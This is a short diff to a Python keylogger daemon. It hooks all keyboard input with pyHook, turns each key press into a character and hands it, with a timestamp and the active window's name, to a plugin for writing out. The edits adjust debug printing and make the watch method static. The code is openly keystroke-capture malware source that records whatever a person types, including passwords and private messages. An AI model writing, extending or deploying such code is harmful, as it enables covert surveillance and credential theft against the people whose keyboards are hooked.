@@ -27,13 +27,13 @@ class KeyLoggerDaemon:
 
         self.plugin = PluginManager().plugin
 
-    # @thread_lock
     def __write_event(self, event: pyHook.KeyboardEvent):
         """
         keyboard press callback, process each key press as necessary.
         the buffer is written out on every key event
         """
-        print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
+        # print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
+        print(event.Key)
         key = chr(int(event.Ascii))
         if key == '\x00':
             key = event.Key
@@ -41,7 +41,8 @@ class KeyLoggerDaemon:
         self.plugin.write(datetime.now(), event.WindowName, key)
         return True  # required by hook manager
 
-    def watch(self):
+    @staticmethod
+    def watch():
         """
         Starts the hook event loop
         """
